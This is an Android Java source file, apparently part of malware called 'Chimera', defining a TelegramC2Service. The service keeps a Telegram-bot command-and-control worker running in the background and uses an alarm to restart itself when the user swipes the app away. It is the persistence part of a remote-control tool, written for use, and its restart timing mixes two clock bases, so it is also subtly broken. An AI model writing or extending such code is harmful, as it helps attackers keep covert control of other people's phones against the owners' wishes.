package com.chimera;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class TelegramC2Service extends Service {
    private Thread workerThread;
    private static final String CHANNEL_ID = "chimeraChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
        }
        createNotifChannel();
        startForeground(1, createNotification());
        try {
            startWorker();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnCreate", e);
        }
    }

    private void createNotifChannel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Chimera Service", NotificationManager.IMPORTANCE_LOW);
                NotificationManager nm = getSystemService(NotificationManager.class);
                nm.createNotificationChannel(chan);
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_CreateChannel", e);
        }
    }

    private Notification createNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("Chimera Running");
        b.setSmallIcon(android.R.drawable.stat_notify_sync);
        return b.build();
    }

    private void startWorker() {
        try {
            if (workerThread == null || !workerThread.isAlive()) {
                workerThread = new Thread(new TelegramBotWorker(this));
                workerThread.start();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startWorker();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        try {
            if (workerThread != null) workerThread.interrupt();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ADDED: THIS METHOD IS CALLED WHEN THE USER SWIPES THE APP FROM RECENTS
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            // Schedule the service to restart
            Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
            restartServiceIntent.setPackage(getPackageName());

            PendingIntent restartServicePendingIntent = PendingIntent.getService(
                    getApplicationContext(),
                    1000, // A unique request code
                    restartServiceIntent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );

            AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
            alarmService.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, restartServicePendingIntent);

        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }
}